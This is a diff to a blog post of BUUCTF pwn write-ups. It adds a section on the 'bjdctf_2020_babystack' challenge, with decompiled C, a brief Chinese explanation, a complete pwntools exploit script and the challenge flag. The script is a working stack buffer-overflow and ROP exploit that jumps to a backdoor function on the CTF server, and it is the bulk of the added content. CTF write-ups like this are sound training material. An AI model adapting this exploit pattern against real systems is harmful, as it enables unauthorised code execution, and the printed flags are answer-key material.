@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BUUCTF"
 published: 2025-07-05
-updated: 2025-07-07
+updated: 2025-07-08
 description: "Write-ups for BUUCTF's pwn aspect."
 image: "./covers/buuctf.png"
 tags: ["Pwn", "Write-ups"]
@@ -804,3 +804,95 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{e913a0b0-686a-4aec-a25e-503e2dc2d226}`
+
+# bjdctf_2020_babystack
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+```c del={16,18}
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _BYTE buf[12]; // [rsp+0h] [rbp-10h] BYREF
+  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  LODWORD(nbytes) = 0;
+  puts("**********************************");
+  puts("*     Welcome to the BJDCTF!     *");
+  puts("* And Welcome to the bin world!  *");
+  puts("*  Let's try to pwn the world!   *");
+  puts("* Please told me u answer loudly!*");
+  puts("[+]Are u ready?");
+  puts("[+]Please input the length of your name:");
+  __isoc99_scanf("%d", &nbytes);
+  puts("[+]What's u name?");
+  read(0, buf, (unsigned int)nbytes);
+  return 0;
+}
+```
+
+`read` 读取多少字符是通过 `__isoc99_scanf` 控制的。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import ROP, args, context, flat, gdb, process, remote
+
+gdbscript = """
+b *main+197
+b *main+208
+c
+"""
+
+FILE = "./bjdctf_2020_babystack"
+HOST, PORT = "node5.buuoj.cn", 29741
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def construct_payload():
+    elf = context.binary
+    rop = ROP(elf)
+
+    payload = flat(b"A" * 0x18, rop.ret.address, elf.symbols["backdoor"])
+
+    return payload
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload()
+
+    target.sendlineafter(b"your name:", b"1337")
+    target.sendlineafter(b"What's u name?", payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{3e70b773-5928-4c8e-9520-b5c5fc9d2fff}`
